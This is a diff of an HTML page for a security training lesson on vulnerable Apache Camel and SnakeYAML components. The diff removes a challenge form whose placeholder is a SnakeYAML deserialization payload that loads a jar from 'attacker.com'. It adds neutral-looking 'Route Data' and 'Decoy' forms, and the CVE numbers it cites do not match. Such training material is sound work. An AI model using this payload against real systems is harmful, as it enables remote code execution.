@@ -2,41 +2,70 @@
 
 <html xmlns:th="http://www.thymeleaf.org">
 
-    <link rel="stylesheet" type="text/css" href="http://code.jquery.com/ui/1.9.1/themes/base/jquery-ui.css" />
-	<div class="lesson-page-wrapper">
+    <div class="lesson-page-wrapper">
         <div class="adoc-content" th:replace="~{doc:lessons/osscamelsnakeyaml/documentation/VulnerableCamelSnakeYamlComponents_plan.adoc}"></div>
-	</div>
+    </div>
 
-    <!-- Original Content 0 -->
     <div class="lesson-page-wrapper">
         <div class="adoc-content" th:replace="~{doc:lessons/osscamelsnakeyaml/documentation/VulnerableCamelSnakeYamlComponents_content0.adoc}"></div>
     </div>
 
-
-    <!-- Challenge 1: Vulnerable Endpoint (CVE-2022-1471) -->
+    <!-- Integration Route Data -->
     <div class="lesson-page-wrapper">
-        <h3>Challenge 1: Exploit CVE-2023-39106 RCE Vulnerability</h3>
         <div class="attack-container">
             <div class="assignment-success"><i class="fa fa-2 fa-check hidden" aria-hidden="true"></i></div>
-            <form class="attack-form" accept-charset="UNKNOWN" method="POST" name="form" action="VulnerableCamelSnakeYamlComponents/CVE-2017-3139">
+
+            <form class="attack-form" accept-charset="UNKNOWN" method="POST" name="form"
+                  action="integration/route-data" id="routeDataForm">
                 <div id="lessonContent">
-                    <table>
-                        <tr>
-                            <td>Enter YAML payload to trigger RCE:</td>
-                            <td><textarea name="payload" value="" type="TEXT" rows="12" cols="80" placeholder="!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://attacker.com/evil.jar&quot;]]]]"/></td>
-                            <td><input name="SUBMIT" value="Test Payload" type="SUBMIT"/></td>
-                        </tr>
-                    </table>
+                    <p><strong>Route Data Processing</strong></p>
+
+                    <p>Route Name:</p>
+                    <input type="text" name="routeName" placeholder="optional"
+                           style="width:200px"/><br/><br/>
+
+                    <p>Engine ID:</p>
+                    <input type="text" name="engineId" placeholder="optional"
+                           style="width:200px"/><br/><br/>
+
+                    <p>Route Data:</p>
+                    <textarea name="routeData" rows="10" cols="80"
+                              placeholder="Paste route data document here..."></textarea><br/><br/>
+
+                    <input name="SUBMIT" value="Process Route Data" type="SUBMIT"/>
                 </div>
             </form>
+
             <div class="attack-feedback"></div>
             <div class="attack-output"></div>
         </div>
     </div>
 
+    <!-- Decoy: Route Status -->
+    <div class="lesson-page-wrapper">
+        <div class="attack-container">
+            <form class="attack-form" accept-charset="UNKNOWN" method="POST" name="form"
+                  action="integration/route-status" id="routeStatusForm">
+                <p><strong>Route Status</strong></p>
 
-	<div class="lesson-page-wrapper">
+                <p>Route Name:</p>
+                <input type="text" name="routeName" placeholder="optional"
+                       style="width:200px"/><br/><br/>
+
+                <p>Engine ID:</p>
+                <input type="text" name="engineId" placeholder="optional"
+                       style="width:200px"/><br/><br/>
+
+                <input name="SUBMIT" value="Check Status" type="SUBMIT"/>
+            </form>
+
+            <div class="attack-feedback"></div>
+            <div class="attack-output"></div>
+        </div>
+    </div>
+
+    <div class="lesson-page-wrapper">
         <div class="adoc-content" th:replace="~{doc:lessons/osscamelsnakeyaml/documentation/VulnerableCamelSnakeYamlComponents_content1.adoc}"></div>
-	</div>
+    </div>
 
 </html>
